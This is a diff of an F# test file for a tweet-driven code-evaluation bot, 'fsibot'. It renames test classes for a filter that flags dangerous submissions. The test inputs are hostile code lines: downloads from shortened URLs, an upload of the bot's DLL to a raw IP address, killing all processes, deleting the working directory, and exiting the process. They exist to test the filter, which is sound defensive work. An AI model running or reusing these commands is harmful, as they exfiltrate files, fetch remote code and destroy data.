@@ -21,7 +21,7 @@ type ``Session tests`` () =
         let code = "0 |> Seq.unfold (fun x -> Some(x,x+1)) |> Seq.toList"
         runSession (10*sec) code |> should equal EvaluationTimeout
 
-type ``Filters tests`` () =
+type ``Basic analysis`` () =
 
     [<TestCase("""@fsibot (http://System.Net    .WebClient()).DownloadFile("http://bit.ly/fugetmaster ","fuget.fsx")""", Result=true)>]
     [<TestCase("""@fsibot System. Net. WebClient().UploadFile("http://176.10.137.206:8086/", "fsibot.dll" """, Result=true)>]
@@ -53,17 +53,14 @@ type ``Filters tests`` () =
     [<TestCase("""@fsibot System.Diagnostics.Process.GetProcesses() |> Array.Parallel.iter (fun p -> p.Kill())""", Result=true)>]
     [<TestCase("""@fsibot System.Environment.Exit(0)""", Result=true)>]
     [<TestCase("""@fsibot System.Threading.Thread.CurrentThread.Abort()""", Result=true)>]
-    member test.``Bad guys`` (code:string) =
+    member test.``Unsafe code`` (code:string) =
         match code with
         | Danger _ -> true
         | _ -> false
 
-type ``Full message tests`` () =
-
+type ``Token analysis`` () =
+    
     let unsafe = [
-//        """@fsibot http://System.IO.Directory .Delete(System.Environment.CurrentDirectory)"""
-//        """@fsibot (http://System.Net    .WebClient()).DownloadFile("http://bit.ly/fugetmaster ","fuget.fsx")"""
-//        """@fsibot (http://System.Net .WebClient()).DownloadFile("http://bit.ly/1nO1RUi ","p.jpg")"""
         """@fsibot (http://System.Net.WebClient()).DownloadFile("http://bit.ly/1nO1RUi ","p.jpg")"""
         """@fsibot http://System.IO.Directory .Delete(System.Environment.CurrentDirectory)"""
         """@fsibot System. Net. WebClient().UploadFile("http://176.10.137.206:8086/", "fsibot.dll" """
